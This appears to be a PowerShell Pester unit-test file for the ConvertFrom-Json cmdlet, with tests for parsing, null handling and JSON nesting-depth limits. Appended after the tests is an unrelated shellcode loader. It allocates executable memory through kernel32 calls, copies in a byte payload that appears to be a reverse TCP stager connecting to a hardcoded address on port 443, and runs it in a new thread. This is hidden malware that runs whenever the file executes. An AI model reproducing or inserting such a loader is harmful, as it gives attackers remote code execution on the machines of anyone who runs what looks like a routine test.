


function New-NestedJson {
    Param(
        [ValidateRange(1, 2048)]
        [int]
        $Depth
    )

    $nestedJson = "true"

    $Depth..1 | ForEach-Object {
        $nestedJson = '{"' + $_ + '":' + $nestedJson + '}'
    }

    return $nestedJson
}

function Count-ObjectDepth {
    Param([PSCustomObject] $InputObject)

    for ($i=1; $i -le 2048; $i++)
    {
        $InputObject = Select-Object -InputObject $InputObject -ExpandProperty $i
        if ($InputObject -eq $true)
        {
            return $i
        }
    }
}

Describe 'ConvertFrom-Json Unit Tests' -tags "CI" {

    BeforeAll {
        $testCasesWithAndWithoutAsHashtableSwitch = @(
            @{ AsHashtable = $true  }
            @{ AsHashtable = $false }
        )
    }

    It 'Can convert a single-line object with AsHashtable switch set to <AsHashtable>' -TestCases $testCasesWithAndWithoutAsHashtableSwitch {
        Param($AsHashtable)
        ('{"a" : "1"}' | ConvertFrom-Json -AsHashtable:$AsHashtable).a | Should -Be 1
    }

    It 'Can convert one string-per-object with AsHashtable switch set to <AsHashtable>' -TestCases $testCasesWithAndWithoutAsHashtableSwitch {
        Param($AsHashtable)
        $json = @('{"a" : "1"}', '{"a" : "x"}') | ConvertFrom-Json -AsHashtable:$AsHashtable
        $json.Count | Should -Be 2
        $json[1].a | Should -Be 'x'
        if ($AsHashtable)
        {
            $json | Should -BeOfType Hashtable
        }
    }

    It 'Can convert multi-line object with AsHashtable switch set to <AsHashtable>' -TestCases $testCasesWithAndWithoutAsHashtableSwitch {
        Param($AsHashtable)
        $json = @('{"a" :', '"x"}') | ConvertFrom-Json -AsHashtable:$AsHashtable
        $json.a | Should -Be 'x'
        if ($AsHashtable)
        {
            $json | Should -BeOfType Hashtable
        }
    }

    It 'Can convert an object with Newtonsoft.Json metadata properties with AsHashtable switch set to <AsHashtable>' -TestCases $testCasesWithAndWithoutAsHashtableSwitch {
        Param($AsHashtable)
        $id = 13
        $type = 'Calendar.Months.December'
        $ref = 1989

        $json = '{"$id":' + $id + ', "$type":"' + $type + '", "$ref":' + $ref + '}' | ConvertFrom-Json -AsHashtable:$AsHashtable

        $json.'$id' | Should -Be $id
        $json.'$type' | Should -Be $type
        $json.'$ref' | Should -Be $ref

        if ($AsHashtable)
        {
            $json | Should -BeOfType Hashtable
        }
    }

    It 'Can convert an object of depth 1024 by default with AsHashtable switch set to <AsHashtable>' -TestCases $testCasesWithAndWithoutAsHashtableSwitch {
        Param($AsHashtable)
        $nestedJson = New-NestedJson -Depth 1024

        $json = $nestedJson | ConvertFrom-Json -AsHashtable:$AsHashtable

        if ($AsHashtable)
        {
            $json | Should -BeOfType Hashtable
        }
        else
        {
            $json | Should -BeOfType PSCustomObject
        }
    }

    It 'Fails to convert an object of depth higher than 1024 by default with AsHashtable switch set to <AsHashtable>' -TestCases $testCasesWithAndWithoutAsHashtableSwitch {
        Param($AsHashtable)
        $nestedJson = New-NestedJson -Depth 1025

        { $nestedJson | ConvertFrom-Json -AsHashtable:$AsHashtable } |
            Should -Throw -ErrorId "System.ArgumentException,Microsoft.PowerShell.Commands.ConvertFromJsonCommand"
    }

    It 'Can convert null' {
        'null' | ConvertFrom-Json | Should -Be $null
        $out = '[1, null, 2]' | ConvertFrom-Json
        $out.Length | Should -Be 3

        
        $out[0] | Should -Be 1
        $out[1] | Should -Be $null
        $out[2] | Should -Be 2
    }
}

Describe 'ConvertFrom-Json -Depth Tests' -tags "Feature" {

    BeforeAll {
        $testCasesJsonDepthWithAndWithoutAsHashtableSwitch = @(
            @{ Depth = 2;    AsHashtable = $true  }
            @{ Depth = 2;    AsHashtable = $false }
            @{ Depth = 200;  AsHashtable = $true  }
            @{ Depth = 200;  AsHashtable = $false }
            @{ Depth = 2000; AsHashtable = $true  }
            @{ Depth = 2000; AsHashtable = $false }
        )
    }

    It 'Can convert an object with depth less than Depth param set to <Depth> and AsHashtable switch set to <AsHashtable>' -TestCases $testCasesJsonDepthWithAndWithoutAsHashtableSwitch {
        Param($AsHashtable, $Depth)
        $nestedJson = New-NestedJson -Depth ($Depth - 1)

        $json = $nestedJson | ConvertFrom-Json -AsHashtable:$AsHashtable -Depth $Depth

        if ($AsHashtable)
        {
            $json | Should -BeOfType Hashtable
        }
        else
        {
            $json | Should -BeOfType PSCustomObject
        }

        (Count-ObjectDepth -InputObject $json) | Should -Be ($Depth - 1)
    }

    It 'Can convert an object with depth equal to Depth param set to <Depth> and AsHashtable switch set to <AsHashtable>' -TestCases $testCasesJsonDepthWithAndWithoutAsHashtableSwitch {
        Param($AsHashtable, $Depth)
        $nestedJson = New-NestedJson -Depth:$Depth

        $json = $nestedJson | ConvertFrom-Json -AsHashtable:$AsHashtable -Depth $Depth

        if ($AsHashtable)
        {
            $json | Should -BeOfType Hashtable
        }
        else
        {
            $json | Should -BeOfType PSCustomObject
        }

        (Count-ObjectDepth -InputObject $json) | Should -Be $Depth
    }

    It 'Fails to convert an object with greater depth than Depth param set to <Depth> and AsHashtable switch set to <AsHashtable>' -TestCases $testCasesJsonDepthWithAndWithoutAsHashtableSwitch {
        Param($AsHashtable, $Depth)
        $nestedJson = New-NestedJson -Depth ($Depth + 1)

        { $nestedJson | ConvertFrom-Json -AsHashtable:$AsHashtable -Depth $Depth } |
            Should -Throw -ErrorId "System.ArgumentException,Microsoft.PowerShell.Commands.ConvertFromJsonCommand"
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x2d,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

